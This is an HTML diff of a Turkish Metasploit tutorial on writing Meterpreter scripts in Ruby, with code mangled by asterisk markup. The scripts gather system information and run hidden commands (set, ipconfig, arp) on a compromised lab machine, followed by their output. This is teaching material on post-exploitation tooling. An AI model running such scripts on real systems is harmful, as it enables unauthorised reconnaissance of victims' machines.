ProgramFiles***=*** C:\Program Files PROMPT***=*** $P$G SystemDrive***=*** C: SystemRoot***=*** C:\WINNT TEMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp TMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp USERDOMAIN***=*** TARGET USERNAME***=*** P0WN3D USERPROFILE***=*** C:\Documents and Settings\P0WN3D windir***=*** C:\WINNT ***[*** ******* ***]*** running command ipconfig /all ***[*** ******* ***]*** Windows 2000 IP Configuration Host Name . . . . . . . . . . . . : target Primary DNS Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No DNS Suffix Search List. . . . . . : localdomain Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : localdomain Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter Physical Address. . . . . . . . . : 00-0C-29-85-81-55 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes IP Address. . . . . . . . . . . . : 172.16.104.145 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.104.2 DHCP Server . . . . . . . . . . . : 172.16.104.254 DNS Servers . . . . . . . . . . . : 172.16.104.2 Primary WINS Server . . . . . . . : 172.16.104.2 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM ***[*** ******* ***]*** running command arp -a ***[*** ******* ***]*** Interface: 172.16.104.145 on Interface 0x1000003 Internet Address Physical Address Type 172.16.104.2 00-50-56-eb-db-06 dynamic 172.16.104.150 00-0c-29-a7-f1-c5 dynamic meterpreter ***&gt;*** Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.">
   <meta itemprop="datePublished" content="2017-06-14T13:49:00+00:00">
   <meta itemprop="dateModified" content="2017-06-14T13:49:00+00:00">
-  <meta itemprop="wordCount" content="951">
+  <meta itemprop="wordCount" content="1035">
   <meta itemprop="keywords" content="Cybersecurity,Metasploit Framework">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="MSF Meterpreter Script Düzenleme">
-  <meta name="twitter:description" content="Script Yazma Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne kayıt edelim.
-root@kali:~# echo “print_status(“Hello World”)” &gt; /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
-meterpreter &gt; run helloworld [*] Hello World meterpreter &gt; Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını helloworld.rb dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.">
+  <meta name="twitter:description" content="Script Yazma Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne kayıt edelim. root@kali:~# echo “print_status***(*** “Hello World”***)*** ” ***&gt;*** /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım. meterpreter ***&gt;*** run helloworld ***[*** ******* ***]*** Hello World meterpreter ***&gt;*** Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını helloworld.rb dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz. print_error***(*** “this is an error!”***)*** print_line***(*** “this is a line”***)*** Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım. meterpreter ***&gt;*** run helloworld ***[*** ******* ***]*** Hello World ***[*** -] this is an error! this is a line meterpreter ***&gt;*** helloworld.rb Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır. print_status(&#34;Hello World&#34;) print_error(&#34;this is an error!&#34;) print_line(&#34;This is a line&#34;) Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır. def geninfo***(*** session***)*** begin ….. rescue ::Exception ***=&gt;*** e ….. end end Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra helloworld.rb dosyamızın içeriği aşağıdaki gibi olacaktır. def getinfo***(*** session***)*** begin sysnfo ***=*** session.sys.config.sysinfo runpriv ***=*** session.sys.config.getuid print_status***(*** &#34;Getting system information ...&#34;***)*** print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** print_status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** rescue ::Exception ***=&gt;*** e print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** end end Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri session değişkeninden alan getinfo(session) isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir. sysnfo = session.sys.config.sysinfo satırı sistem bilgisini getirirken runpriv = session.sys.config.getuid kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır. helloworld2.rb İlk oluşturduğumuz dosyaya ufak bir ilave yaparak helloworld2.rb dosyası üretelim. helloworld2.rb dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı helloworld2.rb olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır. def getinfo***(*** session***)*** begin sysnfo ***=*** session.sys.config.sysinfo runpriv ***=*** session.sys.config.getuid print_status***(*** &#34;Getting system information ...&#34;***)*** print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** print _status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** rescue ::Exception ***=&gt;*** e print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** end end getinfo***(*** client***)*** Şimdi hazırladığımız helloworld2.rb dosyamızı Meterpreter oturumunda çalıştıralım. meterpreter ***&gt;*** run helloworld2 ***[*** ******* ***]*** Getting system information ... ***[*** ******* ***]*** The target machine OS is Windows XP ***(*** Build 2600, Service Pack 3***)*** . ***[*** ******* ***]*** The computer name is Computer ***[*** ******* ***]*** Script running as WINXPVM01labuser Gördüğünüz gibi helloworld2.rb scripti ile bir takım sistem bigilerini ele etmiş olduk. helloworld3.rb Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır. def list_exec***(*** session,cmdlst***)*** print_status***(*** &#34;Running Command List ...&#34;***)*** r***=*** &#39;&#39; session.response_timeout***=*** 120 cmdlst.each ***do*** |cmd| begin print_status &#34;running command #{cmd}&#34; r ***=*** session.sys.process.execute***(*** &#34;cmd.exe /c #{cmd}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true, &#39;Channelized&#39; ***=&gt;*** true***})*** ***while*** ***(*** d ***=*** r.channel.read***)*** print_status***(*** &#34;t#{d}&#34;***)*** end r.channel.close r.close rescue ::Exception ***=&gt;*** e print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** end end end commands ***=*** ***[*** &#34;set&#34;, &#34;ipconfig /all&#34;, &#34;arp -a&#34;***]*** list_exec***(*** client,commands***)*** Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, list_exec isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon, session ve cmdlist isimli iki değişken almaktadır. cmdlist değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak cmd.exe üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için session.response_timeout=120 120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır. cmdlist dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır. commands ***=*** ***[*** “set”, “ipconfig /all”, “arp –a”] Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı list_exec(client,commands) bulunmaktadır. Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım. meterpreter ***&gt;*** run helloworld3 ***[*** ******* ***]*** Running Command List ... ***[*** ******* ***]*** running command set ***[*** ******* ***]*** ALLUSERSPROFILE***=*** C:\Documents and Settings\All Users APPDATA***=*** C:\Documents and Settings\P0WN3D\Application Data CommonProgramFiles***=*** C:\Program Files\Common Files COMPUTERNAME***=*** TARGET ComSpec***=*** C:\WINNT\system32\cmd.exe HOMEDRIVE***=*** C: HOMEPATH***=*** LOGONSERVER***=*** TARGET NUMBER_OF_PROCESSORS***=*** 1 OS***=*** Windows_NT Os2LibPath***=*** C:\WINNT\system32\os2dll; Path***=*** C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem PATHEXT***=*** .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH PROCESSOR_ARCHITECTURE***=*** x86 PROCESSOR_IDENTIFIER***=*** x86 Family 6 Model 7 Stepping 6, GenuineIntel PROCESSOR_LEVEL***=*** 6 PROCESSOR_REVISION***=*** 0706 ProgramFiles***=*** C:\Program Files PROMPT***=*** $P$G SystemDrive***=*** C: SystemRoot***=*** C:\WINNT TEMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp TMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp USERDOMAIN***=*** TARGET USERNAME***=*** P0WN3D USERPROFILE***=*** C:\Documents and Settings\P0WN3D windir***=*** C:\WINNT ***[*** ******* ***]*** running command ipconfig /all ***[*** ******* ***]*** Windows 2000 IP Configuration Host Name . . . . . . . . . . . . : target Primary DNS Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No DNS Suffix Search List. . . . . . : localdomain Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : localdomain Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter Physical Address. . . . . . . . . : 00-0C-29-85-81-55 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes IP Address. . . . . . . . . . . . : 172.16.104.145 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.104.2 DHCP Server . . . . . . . . . . . : 172.16.104.254 DNS Servers . . . . . . . . . . . : 172.16.104.2 Primary WINS Server . . . . . . . : 172.16.104.2 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM ***[*** ******* ***]*** running command arp -a ***[*** ******* ***]*** Interface: 172.16.104.145 on Interface 0x1000003 Internet Address Physical Address Type 172.16.104.2 00-50-56-eb-db-06 dynamic 172.16.104.150 00-0c-29-a7-f1-c5 dynamic meterpreter ***&gt;*** Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.">
 
     <link href="/css/compiled/main.css" rel="stylesheet" />
 
@@ -9701,41 +9904,41 @@ meterpreter &gt; run helloworld [*] Hello World meterpreter &gt; Basit bir Ruby 
 <h1 class="wp-block-heading" id="script-yazma">Script Yazma 
 <!-- /wp:heading -->
 <!-- wp:paragraph -->
-<p>Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve&nbsp;<code>helloworld.rb</code>&nbsp;olarak&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter</code>&nbsp;klasörüne kayıt edelim.</p>
+<p>Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve&nbsp;<code>helloworld.rb</code>&nbsp;olarak&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter</code>&nbsp;klasörüne kayıt edelim.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# echo “print_status<strong>(</strong>“Hello World”<strong>)</strong>” <strong>&gt;</strong> /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# echo “print_status***(*** “Hello World”***)*** ” ***&gt;***  /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.</p>
+<p>Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run helloworld
-<strong>[</strong><strong>*</strong><strong>]</strong> Hello World
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run helloworld
+***[*** ******* ***]***  Hello World
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.</p>
+<p>Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">print_error<strong>(</strong>“this is an error!”<strong>)</strong>
-print_line<strong>(</strong>“this is a line”<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">print_error***(*** “this is an error!”***)*** 
+print_line***(*** “this is a line”***)*** 
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.</p>
+<p>Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run helloworld
-<strong>[</strong><strong>*</strong><strong>]</strong> Hello World
-<strong>[</strong>-] this is an error!
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run helloworld
+***[*** ******* ***]***  Hello World
+***[*** -] this is an error!
 this is a line
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:heading {"level":1} -->
 <h1 class="wp-block-heading" id="helloworldrb">helloworld.rb 
 <!-- /wp:heading -->
 <!-- wp:paragraph -->
-<p>Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.</p>
+<p>Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">print_status("Hello World")
 print_error("this is an error!")
@@ -9743,151 +9946,151 @@ print_line("This is a line")
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.</p>
+<p>Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> def geninfo<strong>(</strong>session<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> def geninfo***(*** session***)*** 
     begin
     …..
-    rescue ::Exception <strong>=&gt;</strong> e
+    rescue ::Exception ***=&gt;***  e
     …..
     end
  end
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içeriği aşağıdaki gibi olacaktır.</p>
+<p>Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içeriği aşağıdaki gibi olacaktır.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo<strong>(</strong>session<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo***(*** session***)*** 
     begin
-       sysnfo <strong>=</strong> session.sys.config.sysinfo
-       runpriv <strong>=</strong> session.sys.config.getuid
-       print_status<strong>(</strong>"Getting system information ..."<strong>)</strong>
-       print_status<strong>(</strong>"tThe target machine OS is #{sysnfo['OS']}"<strong>)</strong>
-       print_status<strong>(</strong>"tThe computer name is #{'Computer'} "<strong>)</strong>
-       print_status<strong>(</strong>"tScript running as #{runpriv}"<strong>)</strong>
-    rescue ::Exception <strong>=&gt;</strong> e
-       print_error<strong>(</strong>"The following error was encountered #{e}"<strong>)</strong>
+       sysnfo ***=***  session.sys.config.sysinfo
+       runpriv ***=***  session.sys.config.getuid
+       print_status***(*** "Getting system information ..."***)*** 
+       print_status***(*** "tThe target machine OS is #{sysnfo['OS']}"***)*** 
+       print_status***(*** "tThe computer name is #{'Computer'} "***)*** 
+       print_status***(*** "tScript running as #{runpriv}"***)*** 
+    rescue ::Exception ***=&gt;***  e
+       print_error***(*** "The following error was encountered #{e}"***)*** 
     end
  end
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri&nbsp;<code>session</code>&nbsp;değişkeninden alan&nbsp;<code>getinfo(session)</code>&nbsp;isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir.&nbsp;<code>sysnfo = session.sys.config.sysinfo</code>&nbsp;satırı sistem bilgisini getirirken&nbsp;<code>runpriv = session.sys.config.getuid</code>&nbsp;kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.</p>
+<p>Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri&nbsp;<code>session</code>&nbsp;değişkeninden alan&nbsp;<code>getinfo(session)</code>&nbsp;isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir.&nbsp;<code>sysnfo = session.sys.config.sysinfo</code>&nbsp;satırı sistem bilgisini getirirken&nbsp;<code>runpriv = session.sys.config.getuid</code>&nbsp;kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.
 <!-- wp:heading {"level":1} -->
 <h1 class="wp-block-heading" id="helloworld2rb">helloworld2.rb 
 <!-- /wp:heading -->
 <!-- wp:paragraph -->
-<p>İlk oluşturduğumuz dosyaya ufak bir ilave yaparak&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası üretelim.&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı&nbsp;<code>helloworld2.rb</code>&nbsp;olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.</p>
+<p>İlk oluşturduğumuz dosyaya ufak bir ilave yaparak&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası üretelim.&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı&nbsp;<code>helloworld2.rb</code>&nbsp;olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo<strong>(</strong>session<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo***(*** session***)*** 
     begin
-       sysnfo <strong>=</strong> session.sys.config.sysinfo
-       runpriv <strong>=</strong> session.sys.config.getuid
-       print_status<strong>(</strong>"Getting system information ..."<strong>)</strong>
-       print_status<strong>(</strong>"tThe target machine OS is #{sysnfo['OS']}"<strong>)</strong>
-       print _status<strong>(</strong>"tThe computer name is #{'Computer'} "<strong>)</strong>
-       print_status<strong>(</strong>"tScript running as #{runpriv}"<strong>)</strong>
- rescue ::Exception <strong>=&gt;</strong> e
-       print_error<strong>(</strong>"The following error was encountered #{e}"<strong>)</strong>
+       sysnfo ***=***  session.sys.config.sysinfo
+       runpriv ***=***  session.sys.config.getuid
+       print_status***(*** "Getting system information ..."***)*** 
+       print_status***(*** "tThe target machine OS is #{sysnfo['OS']}"***)*** 
+       print _status***(*** "tThe computer name is #{'Computer'} "***)*** 
+       print_status***(*** "tScript running as #{runpriv}"***)*** 
+ rescue ::Exception ***=&gt;***  e
+       print_error***(*** "The following error was encountered #{e}"***)*** 
     end
  end
 
- getinfo<strong>(</strong>client<strong>)</strong>
+ getinfo***(*** client***)*** 
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Şimdi hazırladığımız&nbsp;<code>helloworld2.rb</code>&nbsp;dosyamızı Meterpreter oturumunda çalıştıralım.</p>
+<p>Şimdi hazırladığımız&nbsp;<code>helloworld2.rb</code>&nbsp;dosyamızı Meterpreter oturumunda çalıştıralım.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run helloworld2
- <strong>[</strong><strong>*</strong><strong>]</strong> Getting system information ...
- <strong>[</strong><strong>*</strong><strong>]</strong>     The target machine OS is Windows XP <strong>(</strong>Build 2600, Service Pack 3<strong>)</strong>.
- <strong>[</strong><strong>*</strong><strong>]</strong>     The computer name is Computer
- <strong>[</strong><strong>*</strong><strong>]</strong>     Script running as WINXPVM01labuser
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run helloworld2
+ ***[*** ******* ***]***  Getting system information ...
+ ***[*** ******* ***]***      The target machine OS is Windows XP ***(*** Build 2600, Service Pack 3***)*** .
+ ***[*** ******* ***]***      The computer name is Computer
+ ***[*** ******* ***]***      Script running as WINXPVM01labuser
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Gördüğünüz gibi&nbsp;<code>helloworld2.rb</code>&nbsp;scripti ile bir takım sistem bigilerini ele etmiş olduk.</p>
+<p>Gördüğünüz gibi&nbsp;<code>helloworld2.rb</code>&nbsp;scripti ile bir takım sistem bigilerini ele etmiş olduk.
 <!-- wp:heading {"level":1} -->
 <h1 class="wp-block-heading" id="helloworld3rb">helloworld3.rb 
 <!-- /wp:heading -->
 <!-- wp:paragraph -->
-<p>Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.</p>
+<p>Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec<strong>(</strong>session,cmdlst<strong>)</strong>
-    print_status<strong>(</strong>"Running Command List ..."<strong>)</strong>
-    r<strong>=</strong>''
-    session.response_timeout<strong>=</strong>120
-    cmdlst.each <strong>do</strong> |cmd|
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec***(*** session,cmdlst***)*** 
+    print_status***(*** "Running Command List ..."***)*** 
+    r***=*** ''
+    session.response_timeout***=*** 120
+    cmdlst.each ***do***  |cmd|
        begin
           print_status "running command #{cmd}"
-          r <strong>=</strong> session.sys.process.execute<strong>(</strong>"cmd.exe /c #{cmd}", nil, <strong>{</strong>'Hidden' <strong>=&gt;</strong> true, 'Channelized' <strong>=&gt;</strong> true<strong>})</strong>
-          <strong>while</strong><strong>(</strong>d <strong>=</strong> r.channel.read<strong>)</strong>
+          r ***=***  session.sys.process.execute***(*** "cmd.exe /c #{cmd}", nil, ***{*** 'Hidden' ***=&gt;***  true, 'Channelized' ***=&gt;***  true***})*** 
+          ***while*** ***(*** d ***=***  r.channel.read***)*** 
  
-             print_status<strong>(</strong>"t#{d}"<strong>)</strong>
+             print_status***(*** "t#{d}"***)*** 
           end
           r.channel.close
           r.close
-       rescue ::Exception <strong>=&gt;</strong> e
-          print_error<strong>(</strong>"Error Running Command #{cmd}: #{e.class} #{e}"<strong>)</strong>
+       rescue ::Exception ***=&gt;***  e
+          print_error***(*** "Error Running Command #{cmd}: #{e.class} #{e}"***)*** 
        end
     end
  end
  
- commands <strong>=</strong> <strong>[</strong> "set",
+ commands ***=***  ***[***  "set",
     "ipconfig  /all",
-    "arp -a"<strong>]</strong>
+    "arp -a"***]*** 
  
- list_exec<strong>(</strong>client,commands<strong>)</strong>
+ list_exec***(*** client,commands***)*** 
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle,&nbsp;<code>list_exec</code>&nbsp;isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon,&nbsp;<code>session</code>&nbsp;ve&nbsp;<code>cmdlist</code>&nbsp;isimli iki değişken almaktadır.&nbsp;<code>cmdlist</code>&nbsp;değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak&nbsp;<code>cmd.exe</code>&nbsp;üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için&nbsp;<code>session.response_timeout=120</code>&nbsp;120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.</p>
+<p>Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle,&nbsp;<code>list_exec</code>&nbsp;isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon,&nbsp;<code>session</code>&nbsp;ve&nbsp;<code>cmdlist</code>&nbsp;isimli iki değişken almaktadır.&nbsp;<code>cmdlist</code>&nbsp;değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak&nbsp;<code>cmd.exe</code>&nbsp;üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için&nbsp;<code>session.response_timeout=120</code>&nbsp;120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.
 <!-- wp:paragraph -->
-<p><code>cmdlist</code>&nbsp;dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.</p>
+<p><code>cmdlist</code>&nbsp;dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> commands <strong>=</strong> <strong>[</strong> “set”,
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> commands ***=***  ***[***  “set”,
     “ipconfig  /all”,
     “arp –a”]
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı&nbsp;<code>list_exec(client,commands)</code>&nbsp;bulunmaktadır.</p>
+<p>Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı&nbsp;<code>list_exec(client,commands)</code>&nbsp;bulunmaktadır.
 <!-- wp:paragraph -->
-<p>Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.</p>
+<p>Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.
 <!-- wp:code -->
